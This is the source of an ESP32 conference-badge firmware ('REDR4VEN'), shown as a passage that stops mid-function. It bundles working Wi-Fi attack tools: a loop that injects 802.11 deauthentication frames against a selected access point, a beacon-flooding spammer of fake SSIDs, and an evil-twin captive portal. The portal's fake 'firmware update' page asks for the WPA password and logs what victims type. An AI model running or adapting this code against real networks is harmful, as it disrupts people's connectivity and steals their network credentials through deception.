// ============================================================================
//  REDR4VEN Badge — v12 (Final CTF Edition)
//  - Captive Portal Funcional (Bypass CNA + Open AP)
//  - Hidden SSID Discovery (<H> MAC)
//  - Layout Y-Axis Optimization (Max Y=127)
//  - Scroll Dinámico + Scrollbar en listas largas (Deauth y Logs)
//  - Deauth Tool: Strict STANDBY by default, Activación manual
//  - Capacidad de LOGS aumentada a 16
//  - Monitor de Batería Calibrado (ADC GPIO 32) con Oversampling
//  - [NUEVO] Beacon Flooding (Spam de SSIDs falsos)
// ============================================================================

#include <Arduino.h>
#include <Preferences.h>
#include <SPI.h>
#include <TFT_eSPI.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <WiFi.h>
#include <mbedtls/md5.h>
#include <mbedtls/sha256.h>
#include "esp_wifi.h"

static const unsigned char epd_bitmap_raven[] PROGMEM = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xf0, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x3f, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xe0, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xc0,
    0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xc0, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x47, 0x07, 0xe0, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x47, 0x07, 0xc0, 0xff, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x47, 0x0f, 0xc0, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x0f, 0xf8, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x1f, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0x3f,
    0xc0, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xf7, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff,
    0xcf, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x48, 0x3f, 0xfe, 0x00, 0x00, 0x00, 0x01,
    0xff, 0xff, 0x48, 0x3f, 0xff, 0x00, 0x00, 0x00, 0x01, 0xff, 0xfc, 0x80, 0x7f, 0xff, 0x00, 0x00,
    0x00, 0x07, 0xff, 0xb8, 0x06, 0x1f, 0xc0, 0x00, 0x00, 0x00, 0x07, 0xff, 0xb8, 0x66, 0x7f, 0xc0,
    0x00, 0x00, 0x00, 0x07, 0xff, 0xb8, 0x74, 0x7f, 0xc0, 0x00, 0x00, 0x00, 0x01, 0xff, 0x43, 0x7a,
    0x3f, 0xc0, 0x00, 0x00, 0x00, 0x01, 0xff, 0x47, 0x7c, 0x3f, 0xc0, 0x00, 0x00, 0x00, 0x01, 0xff,
    0x0f, 0x7c, 0x3f, 0xe0, 0x00, 0x00, 0x01, 0xfe, 0x3f, 0x1f, 0x78, 0x47, 0xf8, 0x00, 0x00, 0x01,
    0xfe, 0x3f, 0x27, 0x70, 0xc7, 0xf8, 0x00, 0x00, 0x07, 0xff, 0xc7, 0x83, 0xc0, 0x38, 0xf8, 0x00,
    0x00, 0x07, 0xf1, 0xc7, 0xc0, 0x07, 0xbf, 0xf8, 0x00, 0x00, 0x07, 0xe1, 0xc7, 0xc0, 0x07, 0xbf,
    0xf8, 0x00, 0x00, 0x3f, 0xf7, 0xf8, 0xf8, 0x78, 0xff, 0xff, 0x00, 0x00, 0x3f, 0xff, 0xf8, 0xfe,
    0x18, 0x7f, 0xff, 0x00, 0x00, 0xff, 0xff, 0xff, 0x3f, 0xff, 0xff, 0xff, 0x00, 0x01, 0xff, 0xff,
    0xff, 0x3f, 0xff, 0xbf, 0xff, 0x00, 0x01, 0xff, 0xff, 0xff, 0xbf, 0xff, 0xff, 0xff, 0x00, 0x01,
    0xfd, 0xb1, 0x81, 0xc7, 0xff, 0xff, 0xff, 0x00, 0x01, 0xfc, 0x21, 0x80, 0xc7, 0xff, 0xff, 0xff,
    0x00, 0x01, 0xf8, 0x1b, 0x1c, 0x07, 0xff, 0xff, 0xff, 0x00, 0x01, 0xe2, 0x7f, 0xff, 0x80, 0xff,
    0xff, 0xff, 0xc0, 0x01, 0xc7, 0xff, 0xff, 0xf8, 0xff, 0xff, 0xff, 0xc0, 0x01, 0xc5, 0xcf, 0xfd,
    0xf8, 0xff, 0xff, 0xff, 0xc0, 0x01, 0xc0, 0x01, 0xf8, 0x3c, 0xff, 0xff, 0xff, 0xc0, 0x00, 0x40,
    0x01, 0xff, 0x1c, 0xff, 0xff, 0xff, 0xc0, 0x00, 0x40, 0x00, 0x3f, 0xe0, 0xff, 0xff, 0xff, 0xc0,
    0x00, 0x40, 0x00, 0x3f, 0xf1, 0xff, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x3f, 0xfb, 0xff, 0xff,
    0xff, 0xc0, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff,
    0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xff, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00,
    0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0x00,
    0x00, 0x00, 0x00, 0x03, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff, 0xff, 0xff,
    0xc0, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff,
    0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xc0, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

#ifndef TFT_BL
#define TFT_BL 12
#endif
#ifndef ROOTED_BADGE_SCREEN_EN
#define ROOTED_BADGE_SCREEN_EN 21
#endif
#ifndef BATT_PIN
#define BATT_PIN 32
#endif

DNSServer dnsServer;
WebServer evilServer(80);
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

const char* captive_html PROGMEM = R"raw(
<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body { font-family: sans-serif; text-align: center; background: #222; color: #eee; margin-top: 50px; }
  .box { background: #333; padding: 20px; border-radius: 8px; display: inline-block; box-shadow: 0 4px 8px rgba(0,0,0,0.5); }
  input, button { margin: 10px 0; padding: 12px; width: 90%; max-width: 300px; border-radius: 4px; border: none; }
  button { background: #d00; color: #fff; font-weight: bold; cursor: pointer; }
</style>
</head><body>
<div class="box">
  <h2>Actualización de Firmware</h2>
  <p>Verifique credenciales de red WiFi</p>
  <form action="/login" method="POST">
    <input type="password" name="pass" placeholder="Clave WPA" required>
    <br><button type="submit">Autenticar</button>
  </form>
</div>
</body></html>
)raw";

struct _Network { String ssid; uint8_t ch = 0; uint8_t bssid[6] = {0,0,0,0,0,0}; };

String bytesToStr(const uint8_t* b, uint32_t size) {
    String s;
    for (uint32_t i = 0; i < size; ++i) {
        if (b[i] < 0x10) s += '0';
        s += String(b[i], HEX);
        if (i + 1 < size) s += ':';
    }
    s.toUpperCase(); return s;
}

void goWifiDeauth(); void initEvilTwin(); void loopEvilTwin(); void handleEvilTwinInput(); void drawEvilTwin(); void addLog(const String& line);

int getBatteryPercentage() {
    uint32_t sum = 0;
    for(int i=0; i<10; i++){
        sum += analogRead(BATT_PIN);
        delay(1);
    }
    uint16_t raw = sum / 10;
    int pct = map(raw, 2500, 3350, 0, 100); 
    if (pct > 100) pct = 100;
    if (pct < 0) pct = 0;
    return pct;
}

// ---------------------------------------------------------------------------
// Beacon Spam Tool (Injects raw 802.11 beacons)
// ---------------------------------------------------------------------------
namespace BeaconSpamTool {
    bool enabled = false;
    unsigned long last_spam = 0;
    
    const String spam_list[] = {
        "RootedCon_2026",
        "Connecting...",
        "Free_WiFi_Fibra",
        "Error_404_Network_Not_Found",
        "FBI_Surveillance_Van",
        "Never_gonna_give_you_up",
        "Never_gonna_let_you_down",
        "Obtaining_IP_Address..."
    };
    const int num_ssids = 8;
    
    void sendBeacon(const String& ssid, uint8_t list_index, uint8_t ch) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        
        // MAC Forjada basada en el indice para consistencia
        uint8_t mac[6] = {0x02, 0x13, 0x37, 0x00, 0x00, list_index}; 
        
        uint8_t packet[128] = {
            0x80, 0x00, 0x00, 0x00, // Frame Control (Beacon), Duration
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // DA: Broadcast
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // SA: Pseudo-Random
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // BSSID: Pseudo-Random
            0x00, 0x00, // Seq Ctrl
            // Timestamp (Fixed dummy)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x64, 0x00, // Beacon Interval (102.4ms)
            0x11, 0x04, // Capabilities (ESS, Privacy)
            
            // Tag 0: SSID
            0x00, 
            (uint8_t)ssid.length()
        };
        
        int pkt_size = 38;
        for(int i=0; i<ssid.length(); i++) packet[pkt_size++] = ssid[i];
        
        // Tag 1: Supported Rates (1, 2, 5.5, 11)
        packet[pkt_size++] = 0x01; packet[pkt_size++] = 0x04;
        packet[pkt_size++] = 0x82; packet[pkt_size++] = 0x84;
        packet[pkt_size++] = 0x8b; packet[pkt_size++] = 0x96;
        
        // Tag 3: DS Parameter (Channel)
        packet[pkt_size++] = 0x03; packet[pkt_size++] = 0x01;
        packet[pkt_size++] = ch;

        wifi_mode_t mode; esp_wifi_get_mode(&mode);
        wifi_interface_t iface = (mode==WIFI_MODE_AP||mode==WIFI_MODE_APSTA) ? WIFI_IF_AP : WIFI_IF_STA;
        esp_wifi_80211_tx(iface, packet, pkt_size, false);
    }
    
    void tick() {
        if (!enabled) return;
        if (millis() - last_spam > 100) { // Envia ráfaga cada 100ms
            for (int i = 0; i < num_ssids; i++) {
                // Alternamos canales (1, 6, 11) para mayor disrupción
                uint8_t ch = (i % 3 == 0) ? 1 : ((i % 3 == 1) ? 6 : 11);
                sendBeacon(spam_list[i], i, ch);
            }
            last_spam = millis();
        }
    }
}

namespace WifiDeauthTool {
    _Network networks[16]; 
    _Network selectedNetwork;
    bool enabled = false; 
    unsigned long scan_now = 0; 
    unsigned long last_deauth = 0;
    uint8_t list_offset = 0;

    void sendDeauth(const uint8_t* bssid, uint8_t ch) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        uint8_t pkt[26] = {
            0xc0,0x00,0x3a,0x01,
            0xff,0xff,0xff,0xff,0xff,0xff,
            bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
            bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
            0x00,0x00,0x07,0x00
        };
        wifi_mode_t mode; esp_wifi_get_mode(&mode);
        wifi_interface_t iface = (mode==WIFI_MODE_AP||mode==WIFI_MODE_APSTA) ? WIFI_IF_AP : WIFI_IF_STA;
        esp_wifi_80211_tx(iface, pkt, sizeof(pkt), false);
    }
    void clearArray() { for (int i=0;i<16;++i) networks[i]=_Network(); }
    void performScan() {
        const int n = WiFi.scanNetworks(false,true);
        clearArray();
        if (n<0) return;
        for (int i=0;i<n&&i<16;++i) {
            networks[i].ssid = WiFi.SSID(i).length() ? WiFi.SSID(i) : ("*H* " + bytesToStr(WiFi.BSSID(i),6).substring(0,5));
            networks[i].ch = WiFi.channel(i);
            const uint8_t* b = WiFi.BSSID(i);
            if (b) memcpy(networks[i].bssid,b,6);
        }
    }
    void init() {
        if (WiFi.getMode()==WIFI_OFF) WiFi.mode(WIFI_STA);
        performScan(); 
        enabled = false; 
        scan_now = millis(); 
        selectedNetwork = _Network();
        list_offset = 0;
        for(int i=0;i<16;++i) if(networks[i].ssid.length()){ selectedNetwork=networks[i]; break; }
    }
    void tick() {
        if (enabled && selectedNetwork.ssid.length() && (millis()-last_deauth>350)) {
            sendDeauth(selectedNetwork.bssid, selectedNetwork.ch);
            last_deauth = millis();
        }
        if ((millis()-scan_now)>=15000UL) {
            performScan(); scan_now = millis();
            if (!selectedNetwork.ssid.length())
                for(int i=0;i<16;++i) if(networks[i].ssid.length()){ selectedNetwork=networks[i]; break; }
        }
    }
}

constexpr uint8_t kAuxPowerPin = 0; constexpr uint32_t kDebounceMs = 18; constexpr uint32_t kRepeatDelayMs = 260; constexpr uint32_t kRepeatRateMs = 110; constexpr uint8_t kScanPageSize = 5; 
constexpr uint8_t kLogCapacity = 16; 

enum ButtonId : uint8_t { BTN_UP=0, BTN_DOWN, BTN_LEFT, BTN_RIGHT, BTN_SELECT, BTN_EXTRA, BTN_COUNT };
enum ViewMode : uint8_t { VIEW_BOOT=0, VIEW_MENU, VIEW_WIFI_SCAN, VIEW_TWIN_DETECT, VIEW_WIFI_DEAUTH, VIEW_EVILTWIN, VIEW_BEACON_SPAM, VIEW_HASH_TOOL, VIEW_LOGS_TOOL };
struct ButtonConfig { ButtonId id; uint8_t pin; }; struct ButtonState { bool raw=false, stable=false, pressed=false, released=false; uint32_t last_flip_ms=0, hold_since_ms=0, last_repeat_ms=0; };
constexpr ButtonConfig kButtons[BTN_COUNT] = { {BTN_UP,27},{BTN_DOWN,15},{BTN_LEFT,25}, {BTN_RIGHT,26},{BTN_SELECT,13},{BTN_EXTRA,33} };

constexpr uint16_t kBg = 0x0000; constexpr uint16_t kPanel = 0x0841; constexpr uint16_t kLine = 0x31A6; constexpr uint16_t kText = 0xFFFF; constexpr uint16_t kDim = 0x9CF3; constexpr uint16_t kWhite = 0xFFFF;
uint16_t uiRed, uiDkRed, uiYellow, uiCyan, uiGreen;

TFT_eSPI tft = TFT_eSPI(); Preferences g_prefs; ButtonState g_buttons[BTN_COUNT];
ViewMode g_view = VIEW_BOOT; uint8_t g_menu_sel = 0; bool g_full_redraw = true; bool g_prefs_ready = false; bool eviltwin_active = false;
uint8_t g_hash_source = 0; uint8_t g_log_offset = 0; uint8_t g_log_count = 0; String g_logs[kLogCapacity];
int g_scan_count = 0; uint8_t g_scan_offset = 0; uint8_t g_twin_offset = 0; uint8_t g_twin_count = 0;
uint32_t g_blink_ms = 0; bool g_blink_state = false; bool g_blink_dirty = false; bool g_boot_drawn = false;

uint16_t panelColor(uint8_t r, uint8_t g, uint8_t b) { return tft.color565(b, g, r); }
void initColors() { uiRed = panelColor(210,10,10); uiDkRed = panelColor(90,0,0); uiYellow = panelColor(200,200,0); uiCyan = panelColor(0,180,210); uiGreen = panelColor(20,200,60); }
void clearPadPixels() {
    tft.startWrite();
    tft.writecommand(0x2A); tft.writedata(0x00); tft.writedata(0x00); tft.writedata(0x00); tft.writedata(0x01);
    tft.writecommand(0x2B); tft.writedata(0x00); tft.writedata(0x00); tft.writedata(0x00); tft.writedata(0x7F);
    tft.writecommand(0x2C); for (int i = 0; i < 2 * 128; i++) { tft.writedata(0x00); tft.writedata(0x00); }
    tft.writecommand(0x2A); tft.writedata(0x00); tft.writedata(0x00); tft.writedata(0x00); tft.writedata(0x9F);
    tft.writecommand(0x2B); tft.writedata(0x00); tft.writedata(0x00); tft.writedata(0x00); tft.writedata(0x00);
    tft.writecommand(0x2C); for (int i = 0; i < 160; i++) { tft.writedata(0x00); tft.writedata(0x00); }
    tft.endWrite();
}
String hexEncode(const uint8_t* d, size_t len) { static const char* H = "0123456789ABCDEF"; String o; o.reserve(len*2); for(size_t i=0;i<len;++i){ o+=H[(d[i]>>4)&0xF]; o+=H[d[i]&0xF]; } return o; }
String md5Hex(const String& s) { uint8_t o[16]; mbedtls_md5_context c; mbedtls_md5_init(&c); mbedtls_md5_starts_ret(&c); mbedtls_md5_update_ret(&c,(const unsigned char*)s.c_str(),s.length()); mbedtls_md5_finish_ret(&c,o); mbedtls_md5_free(&c); return hexEncode(o,16); }
String sha256Hex(const String& s) { uint8_t o[32]; mbedtls_sha256_context c; mbedtls_sha256_init(&c); mbedtls_sha256_starts_ret(&c,0); mbedtls_sha256_update_ret(&c,(const unsigned char*)s.c_str(),s.length()); mbedtls_sha256_finish_ret(&c,o); mbedtls_sha256_free(&c); return hexEncode(o,32); }

void saveLogs() { if(!g_prefs_ready) return; String b; for(uint8_t i=0;i<g_log_count;++i){ if(i) b+='\n'; b+=g_logs[i]; } g_prefs.putString("logs",b); }
void loadLogs() { if(!g_prefs_ready) return; const String b=g_prefs.getString("logs",""); g_log_count=0; g_log_offset=0; int s=0; while(s<=(int)b.length()&&g_log_count<kLogCapacity){ const int nl=b.indexOf('\n',s); String ln=(nl==-1)?b.substring(s):b.substring(s,nl); ln.trim(); if(ln.length()) g_logs[g_log_count++]=ln; if(nl==-1) break; s=nl+1; } }
void addLog(const String& line) { if(!line.length()) return; if(g_log_count<kLogCapacity){ g_logs[g_log_count++]=line; } else { for(uint8_t i=1;i<kLogCapacity;++i) g_logs[i-1]=g_logs[i]; g_logs[kLogCapacity-1]=line; } saveLogs(); }
String currentToolInput(uint8_t src) { switch(src%3){ case 0:return"REDR4VEN"; case 1:return"ROOTEDCON"; default:return WiFi.macAddress(); } }
const char* currentToolSourceLabel(uint8_t src) { switch(src%3){ case 0:return"ALIAS"; case 1:return"EVENTO"; default:return"MAC"; } }

void setupHardware() { pinMode(kAuxPowerPin,OUTPUT); digitalWrite(kAuxPowerPin,HIGH); pinMode(ROOTED_BADGE_SCREEN_EN,OUTPUT); digitalWrite(ROOTED_BADGE_SCREEN_EN,HIGH); pinMode(TFT_BL,OUTPUT); digitalWrite(TFT_BL,LOW); for(size_t i=0;i<BTN_COUNT;++i) pinMode(kButtons[i].pin,INPUT_PULLUP); }
void updateButtons() { const uint32_t now=millis(); for(size_t i=0;i<BTN_COUNT;++i){ ButtonState& s=g_buttons[i]; s.pressed=false; s.released=false; const bool rp=(digitalRead(kButtons[i].pin)==LOW); if(rp!=s.raw){ s.raw=rp; s.last_flip_ms=now; } if((now-s.last_flip_ms)>=kDebounceMs && s.stable!=s.raw){ s.stable=s.raw; if(s.stable){ s.pressed=true; s.hold_since_ms=now; s.last_repeat_ms=now; } else { s.released=true; s.hold_since_ms=0; } } } }
bool pressed(ButtonId id){ return g_buttons[id].pressed; }
bool menuPressed(ButtonId id){ ButtonState& s=g_buttons[id]; const uint32_t now=millis(); if(s.pressed) return true; if(!s.stable) return false; if(s.hold_since_ms==0){ s.hold_since_ms=now; s.last_repeat_ms=now; return false; } if((now-s.hold_since_ms)<kRepeatDelayMs) return false; if((now-s.last_repeat_ms)>=kRepeatRateMs){ s.last_repeat_ms=now; return true; } return false; }

void drawBootStatic() { 
    tft.fillScreen(kBg); clearPadPixels(); 
    tft.fillRect(0,0,tft.width(),3,uiRed); 
    tft.fillRect(0,tft.height()-3,tft.width(),3,uiRed); 
    
    tft.drawBitmap(45,3,epd_bitmap_raven,70,70,uiRed,kBg); 
    
    int batPct = getBatteryPercentage();
    uint16_t batColor = (batPct > 20) ? uiGreen : uiRed;
    
    tft.drawRect(128, 6, 18, 8, kLine);
    tft.fillRect(146, 8, 2, 4, kLine);
    int fillW = (batPct * 14) / 100;
    tft.fillRect(130, 8, fillW, 4, batColor);
    
    tft.setTextColor(kDim, kBg);
    tft.drawRightString(String(batPct) + "%", 148, 17, 1);

    tft.drawFastHLine(10,74,tft.width()-20,kLine); 
    tft.setTextColor(kDim,kBg); 
    tft.drawCentreString("STATUS: ONLINE | PWNED BY:",tft.width()/2,77,1); 
    tft.setTextColor(uiRed,kBg); 
    tft.drawCentreString("REDR4VEN",tft.width()/2,88,2); 
}

void drawBootBlink() { tft.fillRect(0,105,tft.width(),10,kBg); if(g_blink_state){ tft.setTextColor(uiYellow,kBg); tft.drawCentreString("[ PRESS SELECT TO START ]",tft.width()/2,106,1); } }

constexpr uint8_t kMenuItems = 7; 
const char* menuLabelFor(uint8_t i) { static const char* L[kMenuItems] = {"WIFI SCAN","TWIN DETECT","WIFI DEAUTH","EVIL TWIN","BEACON SPAM","HASH","LOGS"}; return L[i % kMenuItems]; }

void drawMenu() {
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0, 0, tft.width(), tft.height(), uiRed);
    tft.drawRect(1, 1, tft.width()-2, tft.height()-2, uiDkRed);
    tft.setTextColor(uiRed, kBg); tft.drawCentreString("REDR4VEN", tft.width()/2, 2, 2);
    tft.setTextColor(kDim, kBg); tft.drawCentreString("[ HACK TOOLS ]", tft.width()/2, 18, 1);
    tft.drawFastHLine(8, 28, tft.width()-16, kLine);
    for (uint8_t i = 0; i < kMenuItems; ++i) {
        const int16_t y = 31 + (i * 12); const bool sel = (i == g_menu_sel);
        const uint16_t bg = sel ? uiRed : kPanel; const uint16_t txt = sel ? kWhite : kText;
        tft.fillRoundRect(12, y, tft.width()-24, 11, 2, bg);
        if(!sel) tft.drawRoundRect(12, y, tft.width()-24, 11, 2, kLine);
        tft.setTextColor(txt, bg);
        if (sel) tft.drawString(">", 15, y+2, 1);
        tft.drawCentreString(menuLabelFor(i), tft.width()/2, y+2, 1);
    }
    tft.setTextColor(kDim, kBg); tft.drawCentreString("UP/DN SEL:ENT EXT:LCK", tft.width()/2, 118, 1);
}

void drawWifiScan() {
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
    tft.setTextColor(uiRed, kBg); tft.drawCentreString("WIFI SCAN", tft.width()/2, 2, 2);
    tft.setTextColor(kDim, kBg); tft.drawCentreString("Redes visibles", tft.width()/2, 18, 1);
    tft.drawFastHLine(8, 28, tft.width()-16, kLine);
    const int s = g_scan_offset, e = min(g_scan_count, s + (int)kScanPageSize);
    int y = 31;
    for(int i=s; i<e; ++i){
        const String ssid = WiFi.SSID(i).length() ? WiFi.SSID(i) : ("*H* " + bytesToStr(WiFi.BSSID(i),6).substring(0,5));
        tft.drawRoundRect(8, y, tft.width()-16, 14, 2, kPanel);
        tft.setTextColor(kText, kBg); tft.drawString(ssid, 12, y+3, 1);
        tft.setTextColor(kDim, kBg); tft.drawRightString(String(WiFi.RSSI(i))+"dBm CH"+String(WiFi.channel(i)), tft.width()-12, y+3, 1);
        y += 16; 
    }
    if(g_scan_count <= 0){ tft.setTextColor(uiYellow, kBg); tft.drawCentreString("Sin resultados", tft.width()/2, 60, 1); }
    tft.setTextColor(kDim, kBg); tft.drawCentreString("SEL:REESCAN EXT:VOLVER", tft.width()/2, 118, 1);
}

void drawTwinDetect() {
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
    tft.setTextColor(uiRed, kBg); tft.drawCentreString("TWIN DETECT", tft.width()/2, 2, 2);
    tft.setTextColor(kDim, kBg); tft.drawCentreString("SSID duplicados", tft.width()/2, 18, 1);
    tft.drawFastHLine(8, 28, tft.width()-16, kLine);
    int pairs=0, row=0;
    for(int i=0; i<g_scan_count && row<4; ++i){
        const String a=WiFi.SSID(i); if(!a.length()) continue;
        for(int j=i+1; j<g_scan_count && row<4; ++j){
            if(a==WiFi.SSID(j)){
                if(pairs>=g_twin_offset && row<4){
                    const int y2 = 31 + (row * 18);
                    tft.drawRoundRect(8, y2, tft.width()-16, 16, 2, kPanel);
                    tft.setTextColor(uiRed, kBg); tft.drawString(a, 12, y2+4, 1);
                    tft.setTextColor(kDim, kBg); tft.drawRightString("CH "+String(WiFi.channel(i))+"/"+String(WiFi.channel(j)), tft.width()-12, y2+4, 1);
                    ++row;
                }
                ++pairs;
            }
        }
    }
    g_twin_count = pairs;
    if(pairs==0){ tft.setTextColor(uiGreen, kBg); tft.drawCentreString("No se detectan twins", tft.width()/2, 60, 1); }
    tft.setTextColor(kDim, kBg); tft.drawCentreString("SEL:REESCAN EXT:VOLVER", tft.width()/2, 118, 1);
}

void drawWifiDeauth() {
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
    tft.setTextColor(uiRed, kBg); tft.drawCentreString("WIFI DEAUTH", tft.width()/2, 2, 2);
    tft.setTextColor(WifiDeauthTool::enabled?uiYellow:kDim, kBg); 
    tft.drawCentreString(WifiDeauthTool::enabled?"[ ACTIVE ]":"[ STANDBY ]", tft.width()/2, 18, 1);
    tft.drawFastHLine(8, 28, tft.width()-16, kLine);
    
    int y = 31;
    int start_idx = WifiDeauthTool::list_offset;
    
    for(int i = start_idx; i < start_idx + 5 && i < 16; ++i){
        if(!WifiDeauthTool::networks[i].ssid.length()) break;
        const bool sel = bytesToStr(WifiDeauthTool::selectedNetwork.bssid,6) == bytesToStr(WifiDeauthTool::networks[i].bssid,6);
        
        tft.drawRoundRect(8, y, tft.width()-20, 14, 2, sel?uiRed:kPanel);
        tft.setTextColor(sel?kWhite:kText, kBg); 
        tft.drawString(WifiDeauthTool::networks[i].ssid, 12, y+3, 1);
        tft.setTextColor(kDim, kBg); 
        tft.drawRightString("CH"+String(WifiDeauthTool::networks[i].ch), tft.width()-16, y+3, 1);
        y += 16;
    }
    
    int total_nets = 0;
    for(int i=0;i<16;++i) { if(WifiDeauthTool::networks[i].ssid.length()) total_nets++; else break; }
    if(total_nets > 5) {
        int bar_h = max(10, (5 * 80) / total_nets);
        int bar_y = 31 + (start_idx * (80 - bar_h)) / (total_nets - 5);
        tft.fillRect(tft.width()-6, bar_y, 4, bar_h, uiRed);
    }

    tft.setTextColor(kDim, kBg); 
    tft.drawCentreString(WifiDeauthTool::enabled?"SEL: APAGAR  EXT:VOLVER":"SEL: ATACAR  EXT:VOLVER", tft.width()/2, 118, 1);
}

void drawEvilTwin() {
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
    tft.setTextColor(uiRed, kBg); tft.drawCentreString("EVILTWIN", tft.width()/2, 2, 2);
    tft.setTextColor(kDim, kBg); tft.drawCentreString("Portal activo", tft.width()/2, 18, 1);
    tft.drawFastHLine(8, 28, tft.width()-16, kLine);
    tft.setTextColor(kWhite, kBg); tft.drawCentreString("SSID: WIFI_GRATIS", tft.width()/2, 45, 1);
    tft.setTextColor(uiYellow, kBg); tft.drawCentreString("Red Abierta (Captive)", tft.width()/2, 60, 1);
    tft.setTextColor(uiGreen, kBg); tft.drawCentreString("Credenciales en", tft.width()/2, 85, 1);
    tft.drawCentreString("seccion LOGS", tft.width()/2, 95, 1);
    tft.setTextColor(kDim, kBg); tft.drawCentreString("EXT: APAGAR Y VOLVER", tft.width()/2, 118, 1);
}

void drawBeaconSpam() {
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
    tft.setTextColor(uiRed, kBg); tft.drawCentreString("BEACON SPAM", tft.width()/2, 2, 2);
    tft.setTextColor(BeaconSpamTool::enabled?uiYellow:kDim, kBg); 
    tft.drawCentreString(BeaconSpamTool::enabled?"[ ACTIVE ]":"[ STANDBY ]", tft.width()/2, 18, 1);
    tft.drawFastHLine(8, 28, tft.width()-16, kLine);
    
    tft.setTextColor(kWhite, kBg); tft.drawCentreString("Generando SSIDs", tft.width()/2, 45, 1);
    tft.setTextColor(kDim, kBg); 
    tft.drawCentreString("Rickroll & Custom List", tft.width()/2, 60, 1);
    
    if (BeaconSpamTool::enabled) {
        tft.setTextColor(uiGreen, kBg); 
        tft.drawCentreString("Inyectando tramas 0x80", tft.width()/2, 85, 1);
    }
    
    tft.setTextColor(kDim, kBg); 
    tft.drawCentreString(BeaconSpamTool::enabled?"SEL: APAGAR  EXT:VOLVER":"SEL: ACTIVAR EXT:VOLVER", tft.width()/2, 118, 1);
}

void drawHashTool() {
    const String in = currentToolInput(g_hash_source);
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
    tft.setTextColor(uiRed, kBg); tft.drawCentreString("HASH", tft.width()/2, 2, 2);
    tft.setTextColor(kDim, kBg); tft.drawCentreString(currentToolSourceLabel(g_hash_source), tft.width()/2, 18, 1);
    tft.drawFastHLine(8, 28, tft.width()-16, kLine);
